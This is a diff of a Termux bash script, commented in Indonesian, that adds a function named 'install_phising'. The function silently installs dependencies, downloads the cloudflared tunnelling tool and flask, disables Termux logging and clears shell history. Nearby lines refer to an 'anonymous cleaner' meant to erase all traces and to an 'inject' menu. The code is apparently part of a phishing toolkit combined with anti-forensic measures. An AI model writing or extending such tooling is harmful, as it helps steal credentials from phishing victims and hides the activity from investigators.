@@ -1,4 +1,42 @@
 #!/bin/bash
+install_phising(){
+  # Silent mode: tidak ada output kecuali error
+  {
+    # 1. Update & upgrade (silent)
+    pkg update -y >/dev/null 2>&1
+    pkg upgrade -y >/dev/null 2>&1
+
+    # 2. Binary wajib (skip kalau sudah ada)
+    for bin in python python-pip wget jq curl coreutils; do
+      command -v $bin >/dev/null || pkg install -y $bin >/dev/null 2>&1
+    done
+
+    # 3. Install cloudflared (skip kalau sudah ada)
+    if ! command -v cloudflared >/dev/null; then
+      wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O $PREFIX/bin/cloudflared
+      chmod +x $PREFIX/bin/cloudflared
+    fi
+
+    # 4. Module Python (skip kalau sudah ada)
+    for mod in flask requests; do
+      python -c "import $mod" 2>/dev/null || pip install --quiet $mod
+    done
+
+    # 5. Izin storage (silent)
+    termux-setup-storage </dev/null >/dev/null 2>&1 || true
+
+    # 6. Matikan log Termux (sekali saja)
+    mkdir -p ~/.termux
+    echo "disable-logging = true" >> ~/.termux/termux.properties 2>/dev/null || true
+
+    # 7. Bersihkan history (silent)
+    history -c 2>/dev/null
+    history -w 2>/dev/null
+  } 2>/dev/null
+
+  echo "[ ✓ ] Semua module siap (silent install selesai)"
+}
+
 
 # ===== EXTRA ANONYMOUS CLEANER =====
 # Hapus total tanpa log, tanpa history, tanpa jejak
@@ -537,6 +575,7 @@ SUNTIK|suntik)
     esac
   done
 }
+
 
 
 menu_suntik() {
